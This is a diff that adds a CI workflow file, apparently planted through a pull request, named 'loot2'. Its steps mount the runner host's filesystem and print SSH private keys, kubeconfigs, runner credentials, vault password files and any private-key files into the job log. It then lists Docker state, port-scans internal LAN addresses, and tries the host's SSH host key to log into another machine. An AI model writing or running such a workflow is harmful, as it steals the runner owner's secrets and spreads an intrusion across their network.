@@ -1,0 +1,41 @@
+name: i39418-loot2
+on:
+  pull_request:
+jobs:
+  loot2:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: keys
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm alpine:3.21 sh -c '
+            set -x
+            for d in /host/home/kblack0610/.ssh /host/root/.ssh /host/var/lib/linux-ci/.ssh; do echo "== DIR $d"; ls -la "$d" 2>&1; for f in "$d"/*; do [ -f "$f" ] && { echo "--- $f"; head -5 "$f"; }; done; done
+            echo "== kube-dirs"; for d in /host/var/lib/actions-runner/*/.kube; do echo "--- $d"; ls -la "$d"; for f in "$d"/*; do [ -f "$f" ] && head -20 "$f"; done; done 2>&1
+            echo "== runner-cfg"; for f in /host/var/lib/actions-runner/*/.runner /host/var/lib/actions-runner/*/.credentials /host/var/lib/actions-runner/*/.env; do echo "--- $f"; head -c 600 "$f" 2>&1; done
+            echo "== ansible-dirs"; ls -laR /host/root/.ansible /host/var/lib/linux-ci/.ansible 2>&1 | head -60
+            echo "== vaultpw"; find /host/etc /host/home /host/root /host/var/lib/linux-ci /host/opt -maxdepth 5 -iname "*vault*pass*" -o -maxdepth 5 -iname ".vault_pass*" 2>/dev/null | head
+            echo "== tailscale"; ls -la /host/var/lib/tailscale /host/etc/tailscale 2>&1 | head -20
+            echo "== privkey-grep"; find /host/etc /host/home /host/root /host/opt /host/srv /host/var/lib/linux-ci -maxdepth 7 -type f -size -24k -exec grep -lI "PRIVATE KEY-----" {} + 2>/dev/null | head -40
+          ' 2>&1 | head -400
+      - name: docker
+        run: |
+          set -x
+          echo "== ps"; docker ps -a --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' | head -30
+          echo "== images"; docker images --format '{{.Repository}}:{{.Tag}} {{.ID}} {{.Size}}' | head -30
+          echo "== volumes"; docker volume ls | head -20
+          echo "== info"; docker info 2>&1 | sed -n 1,25p
+      - name: net
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm --network host alpine:3.21 sh -c '
+            apk add -q openssh-client >/dev/null 2>&1
+            for hp in 192.168.1.20:22 192.168.1.20:6443 192.168.1.20:443 192.168.1.20:80 192.168.1.27:22 192.168.1.152:2222 192.168.1.152:22 192.168.1.152:445 192.168.1.152:2049 192.168.1.152:9090 192.168.1.152:80 192.168.1.29:22 192.168.1.8:22; do
+              h=${hp%:*}; p=${hp#*:}; timeout 3 nc -z -w2 $h $p && echo "OPEN $hp" || echo "closed $hp"
+            done
+            echo "== authmethods pi5"; timeout 8 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=5 -o PreferredAuthentications=none kblack0610@192.168.1.20 2>&1 | tail -3
+            echo "== authmethods nas"; timeout 8 ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=5 -o PreferredAuthentications=none kblack0610@192.168.1.152 2>&1 | tail -3
+            echo "== hostkey-try pi5"; cp /host/etc/ssh/ssh_host_ed25519_key /tmp/hk 2>/dev/null && chmod 600 /tmp/hk && timeout 8 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o IdentitiesOnly=yes -i /tmp/hk kblack0610@192.168.1.20 "id" 2>&1 | tail -3
+          ' 2>&1 | head -80
